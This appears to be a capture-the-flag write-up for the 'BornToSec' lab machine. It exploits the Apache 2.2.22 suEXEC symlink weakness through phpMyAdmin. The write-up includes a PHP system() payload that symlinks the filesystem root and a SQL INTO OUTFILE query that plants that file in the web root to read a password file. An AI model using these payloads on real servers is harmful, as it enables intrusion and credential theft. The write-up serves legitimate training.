<h1>Apache 2.2.22 suEXEC</h1>

<h2>First solution</h2>

As we can see in this snippet from nmap scan the scan Apache version is 2.2.22

```shell
443/tcp open  ssl/http Apache httpd 2.2.22
|_ssl-date: 2023-11-26T09:12:55+00:00; +2s from scanner time.
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-server-header: Apache/2.2.22 (Ubuntu)
```
Apache 2.2.22 has some breach, we will exploit the suEXEC feature, as explained here <a href="https://www.exploit-db.com/exploits/27397">suEXEC</a>

First we need to be admin on phpmyadmin to upload 2 files:
<ul>
    <li>an .htaccess file to be able to use symlimks;</li>
    <li>a .php file that create the symlink to navigate through the machine.</li>
</ul>

.htaccess will allow us tu follow symslinks like this:
    <i>Options Indexes FollowSymLinks</i><br>
then we can upload our php script to redirect to "/"

```
<?php
    system("ln -sf / suexec.php");
?>
```
As explained in exploit-db.com, we can also use builtin function to create symlink (used in second solution).

by requesting suexec.php we navigate to "/" so we can navigate into the folder LOOKATME and finish the escalation same way as first mandatory:

```sql
SELECT 1, "<?php system(\"ln -sf \/ suexec.php\");?>" INTO OUTFILE "/var/www/forum/templates_c/suexec.php"
```

then 
https://<ip_addr>/forum/templates_c/suexec.php/home/LOOKATME/password

<h2>Second solution</h2>

We also can do the same thing without using browser/phpmyadmin to upload files.
As the SQL interface just build POST request, we can send them directly from our computer with a Python script, we just have to rebuild the request like that<br>
<img src="./sql_request.png">